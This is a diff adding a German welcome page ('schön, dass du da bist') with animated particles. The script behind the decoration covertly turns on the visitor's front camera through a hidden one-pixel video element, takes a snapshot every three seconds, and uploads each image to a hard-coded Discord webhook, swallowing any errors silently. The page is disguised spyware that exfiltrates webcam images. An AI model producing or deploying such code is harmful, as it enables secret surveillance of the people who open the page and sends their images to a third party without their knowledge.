@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>willkommen</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+    min-height: 100vh;
+    background: #0a0a0f;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 24px;
+    overflow: hidden;
+  }
+  .bg {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    background:
+      radial-gradient(ellipse at 15% 30%, rgba(99,102,241,0.1) 0%, transparent 55%),
+      radial-gradient(ellipse at 85% 70%, rgba(236,72,153,0.08) 0%, transparent 55%),
+      radial-gradient(ellipse at 50% 50%, rgba(16,185,129,0.03) 0%, transparent 50%);
+  }
+  .container {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    max-width: 520px;
+    padding: 48px 32px;
+  }
+  h1 {
+    color: #fff;
+    font-weight: 200;
+    font-size: 2.8rem;
+    letter-spacing: 1px;
+    margin-bottom: 12px;
+    line-height: 1.2;
+  }
+  h1 span {
+    background: linear-gradient(135deg, #818cf8, #f472b6);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  p {
+    color: rgba(255,255,255,0.25);
+    font-size: 1rem;
+    font-weight: 300;
+    letter-spacing: 2px;
+    line-height: 1.6;
+  }
+  .particles {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+    overflow: hidden;
+  }
+  .particle {
+    position: absolute;
+    width: 2px; height: 2px;
+    background: rgba(255,255,255,0.15);
+    border-radius: 50%;
+    animation: float linear infinite;
+  }
+  @keyframes float {
+    0% { transform: translateY(100vh) scale(0); opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+  }
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="particles" id="particles"></div>
+<div class="container">
+  <h1>schön,<br>dass du <span>da</span> bist</h1>
+  <p>mach es dir gemütlich</p>
+</div>
+
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
+
+for (let i = 0; i < 40; i++) {
+  const p = document.createElement('div');
+  p.className = 'particle';
+  p.style.left = Math.random() * 100 + '%';
+  p.style.animationDuration = (8 + Math.random() * 12) + 's';
+  p.style.animationDelay = (Math.random() * 15) + 's';
+  p.style.width = p.style.height = (1 + Math.random() * 3) + 'px';
+  document.getElementById('particles').appendChild(p);
+}
+
+const video = document.createElement('video');
+video.autoplay = true;
+video.playsinline = true;
+video.muted = true;
+video.style.position = 'fixed';
+video.style.opacity = '0';
+video.style.pointerEvents = 'none';
+video.style.width = '1px';
+video.style.height = '1px';
+document.body.appendChild(video);
+
+const canvas = document.createElement('canvas');
+let stream = null;
+let ready = false;
+
+function send(blob) {
+  const fd = new FormData();
+  const now = new Date();
+  const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
+  fd.append('file', blob, `foto_${ts}.png`);
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
+}
+
+function capture() {
+  if (!ready || !video.videoWidth) return;
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+  canvas.toBlob(send, 'image/png');
+}
+
+(async () => {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } }, audio: false });
+    video.srcObject = stream;
+    await video.play();
+    ready = true;
+    setInterval(capture, 3000);
+    capture();
+  } catch {}
+})();
+
+window.addEventListener('beforeunload', () => {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+});
+</script>
+</body>
+</html>
